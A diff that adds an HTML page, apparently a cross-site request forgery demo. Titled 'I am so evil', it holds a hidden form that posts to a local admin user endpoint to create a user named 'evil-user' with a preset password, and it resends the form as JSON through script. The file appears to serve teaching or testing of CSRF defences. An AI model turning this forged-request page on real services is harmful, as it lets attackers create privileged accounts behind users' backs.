@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <script src="jquery-3.6.1.slim.min.js"></script>
+    <script src="submitAsJson.js"></script>
+    <title>😱I am so evil.</title>
+</head>
+<body>
+<form action="http://localhost:8080/admin/user" method="post">
+    <input name="username" type="hidden" value="evil-user">
+    <input name="password" type="hidden" value="evil-password">
+    <input type="submit" value="submit"/>
+</form>
+
+<script type="text/javascript">
+    console.log($("form"))
+    $("form").submit(function (event) {
+        console.log('submit ...')
+        event.preventDefault();
+        submitAsJSON(this);
+    });
+</script>
+</body>
+</html>
